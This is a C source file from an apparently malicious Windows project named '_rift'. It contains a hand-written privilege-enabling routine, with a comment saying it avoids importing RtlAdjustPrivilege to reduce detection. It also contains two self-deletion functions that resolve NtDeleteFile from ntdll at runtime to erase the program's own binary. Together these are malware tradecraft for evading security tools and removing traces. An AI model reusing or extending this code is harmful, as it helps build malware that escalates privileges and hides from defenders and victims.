#include "_rift.h"

/* I could just link to RtlAdjustPrivilege and call that,
   but where is the fun in that :D
   so lets to it the normal way (the manual one).
   As a side effect the exe won't import RtlAdjustPrivilege...
   which will reduce detection (lol if it weren't for the other stuff). */
BOOL EAdjustPrivilege(
	_In_ PCWSTR szPrivilege,
	_In_ BOOL   bEnablePrivilege
) {
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return FALSE;

	LUID id;
	if (!LookupPrivilegeValueW(NULL, szPrivilege, &id))
		return FALSE;

	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = id;
	tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
		return FALSE;
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
		return FALSE;

	return TRUE;
}

// Temporery
#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

VOID SelfDelete() {
	typedef NTSTATUS(NTAPI* NtDeleteFile)(IN POBJECT_ATTRIBUTES ObjectAttributes);
	NtDeleteFile ntdf = (NtDeleteFile)(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDeleteFile"));
	typedef BOOLEAN(NTAPI* RtlDosPathNameToNtPathName_U)(IN PCWSTR DosName, OUT PUNICODE_STRING NtName, OUT PCWSTR* PartName, OUT PVOID RelativeName);
	RtlDosPathNameToNtPathName_U rtlius = (RtlDosPathNameToNtPathName_U)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlDosPathNameToNtPathName_U");

	UNICODE_STRING us;
	rtlius(L"F:\\Visual Studio Data\\source\\repos\\Win32._rift\\out\\Debug\\_riftdll.dll", &us, NULL, NULL);

	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, &us, NULL, NULL, NULL);
	NTSTATUS nts = ntdf(&oa);
}

VOID SelfDelete2() {
	typedef NTSTATUS(NTAPI* NtDeleteFile)(POBJECT_ATTRIBUTES ObjectAttributes);
	NtDeleteFile ntdf = (NtDeleteFile)(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDeleteFile"));

	PWSTR pFile = AllocMemory((MAX_PATH + 4) * sizeof(WCHAR));
	CopyMemory(pFile, L"\\??\\", 5 * sizeof(WCHAR));
	StringCchCat(pFile, MAX_PATH + 4, g_PIB->szMFN);

	SIZE_T nLen;
	StringCchLengthW(pFile, MAX_PATH + 4, &nLen);
	UNICODE_STRING us;
	us.Length = (USHORT)nLen * sizeof(WCHAR);
	us.MaximumLength = (USHORT)(nLen + 1) * sizeof(WCHAR);
	us.Buffer = pFile;

	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, &us, NULL, NULL, NULL);
	NTSTATUS nts = ntdf(&oa);
}